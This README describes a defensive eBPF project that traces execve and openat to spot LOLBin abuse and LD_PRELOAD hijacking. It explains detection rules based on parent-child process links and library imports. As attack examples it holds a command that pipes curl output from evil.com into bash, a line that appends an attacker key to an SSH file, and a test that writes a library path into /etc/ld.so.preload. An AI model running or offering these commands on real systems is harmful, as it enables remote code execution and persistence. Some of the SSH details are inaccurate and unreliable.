# ATAREE_AMINE

---

## TASK01

This task covers the building of a shared event struct (c+go) and contains all the files necessary to trace the `execve` call

### Files

| File | Description |
|------|-------------|
| `execve.bpf.c` | A C program that's injected into the kernel and gets triggered whenever the syscall `execve` is called |
| `main.go` | Go program that loads `execve.bpf.c` into the kernel and reads the events in realtime; sits in userspace and decodes the results into a shared struct output (agreed struct with `events.go`) — organizes the most important info like PID, UID, process name, and the file executed |
| `events.go` | Defines the shared struct and helper functions used to decode the raw event data |
| `execve_bpf.o` | The compiled C program (BPF object file) |
| `tracer` | The program to run to see output in realtime in your terminal |

### Usage

```zsh
sudo ./tracer
```

> [!NOTE]
> `sudo` was required here due to kernel header access, this may vary depending on your system's BPF permissions.

### Example Output

```
PID: 1234 UID: 1000 COMM: bash FILE: /usr/bin/ls
PID: 1235 UID: 1000 COMM: zsh FILE : /usr/bin/cat
```

---

## TASK02

This task covers a threat model called **LOLBins** (Living Off the Land Binaries) that we'll attach to our `execve` call.

For full docs about LOLBins, see [What are LOLBinaries?](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/), or read the summary below.

---

LOLBins exploit the already legitimate programs (`zsh`, `curl`, `nc`...) to perform malicious actions like downloading malware or launching reverse shells without itself being a malware.

There are **two cases** we'll work with:

| Case | Description |
|------|-------------|
| **Helper case** | LOLBin used as a helper to stage or fetch a bad payload |
| **Fileless case** | Execution happens entirely in memory, nothing written on the disk |

> [!IMPORTANT]
> The *fileless case* is the more dangerous as no file ever touches disk, making it nearly invisible to traditional AV/EDR solutions. For this, a better output for our Ebpf may help us identify a LOLbin attack, and that's by adding PPID to the output.

Examples:
1. An attacker, using a web server that's vulnerable to command injection, gets to type something like `bash -c "$(curl -s https://evil.com)"`, this'll excecute the content of evil.com without touching the disk
2. Using a stolen cred, the attacker can inject their public key to `ssh/hosts` (`echo" their key"  >> /etc/ssh/ssh_known_hosts`), then they would be able to connect later on without another brute force even if the user changes their password.

### Solution (how we'll detect a LOLbin, or atleast suspect it happened)

Because this threat doesn't mess with the disk, and basically runs legitimate binaries, the system (or tracee) can't flag it as an attack, but there could be a hardcoded rules that our Ataree can follow.
Example: the event struct we made outputs the PID, UID, COMM (process name) and the file excecuted, right? and when ataree detects something like `PID:X UID:Y COMM: nginx FILE: usr/bin/bash` then we might've fished out a LOLbin attempt, because why would nginx need to excecute bash or curl or whatever, that's unlikely to be legitimate (unlikely, doesn't mean it's definitely an attack).

Other LOLBIN giveaways:
- Shell spawning another shell: bash spawning sh spawning bash is a classic reverse shell pattern.
- High frequency: same PPID spawning many processes in a short time, like a script running 10 binaries in 2 seconds.

**Why PPID helps:** Knowing the parent process lets us spot suspicious relationships, if a web server like `nginx` or `apache` is the parent of a `bash` or `curl` process, that's a red flag. Legitimate web servers don't spawn shells. Without PPID we only see that bash was executed, with PPID we see **who** executed it, which is what turns a suspicious event into a detectable attack pattern.

Example:
```
PID: 1337 PPID: XXXX UID: A COMM: apache2 FILE: /usr/bin/bash
PID: 2001 PPID: 1337 UID: B COMM: bash    FILE: /usr/bin/bash
PID: 2002 PPID: 2001 UID: C COMM: bash    FILE: /usr/bin/curl
```

We can see that apache here spawned bash in which it spawned curl, similar to the our first example, so that is most liekly a LOLBIN attempt.
Try the helper.sh and fileless.sh in realtime with the bpf program to try and spot the LOLbinaries. You'll get the output as in fileless.png and helper.png

---

# LD_PRELOAD Hijack Detector

## Why this attack matters

LD_PRELOAD hijacking is a persistence and stealth technique used by attackers who have already gained root access on a linux system. Once an attacker writes a malicious shared library path into /etc/ld.so.preload, every single process on the system loads that library automatically, thus surviving reboots and affecting all users

## Why it is hard to detect without eBPF

By the time the malicious library is active, it can intercept and manipulate the very syscalls that userspace detection tools depend on. eBPF operates at the kernel level, below the dynamic linker, meaning it cannot be tampered with or blinded by a loaded library, making it uniquely suited to catch this attack at the only moment it cannot hide itself: the writing process.

## What this detector watches out for

- Any write to /etc/ld.so.preload by an untrusted process (explanation below)
- any execve call carrying LD_PRELOAD pointing to a suspicious path such as /tmp, /dev/shm, or hidden dotfile locations

> [!DANGER]
> Another Type of attack, more dangerous than using LD_PRELOAD is injecting the evil code in a the ld.so.preload, doing so makes the evil library load into memory with EVERY COMMAND a user uses.

### Example Flow

Suppose an attacker has root access to the victim machine (root access is needed, else no writing into the ld.so.preload is granted), the attacker can manipulate PAM_AUTHENTICATE() to return true, hence treating any password as correct, even if the user changes their password.


> [!IMPORTANT]
> the execve syscall isn't used when the programs use ld.so.preload, but openAt does, so we upgraded the ebpf to also monitor openAt.
> After testing `sudo echo "/tmp/test.so" | sudo tee /etc/ld.so.preload`, run `sudo truncate -s 0 /etc/ld.so.preload` to reset ld.so.preload, not doing so will keep your machine running that library even after rebooting


> [!NOTE]
> Since users can load their shared libs to ld.so.preload, we upgrade to detector to inpect what the library calls, a legitimate library usually uses stuff like `stat`, `open`... a malicious one however imports more like `socket`, `ptrace`, `system`... Also, we inspect the hash of the .so file, if it matches the known hashes, then we don't flag it.
> The flow goes as follows:
> 1.Something loads to ld.so.preload or LD_PRELOAD
> 2.we check the hash, if it's known, we don't flag it, else we move to step 3
> 3.We scan the imports, if it imports suspicious functions then we flag it along with the function called, else we let it go through

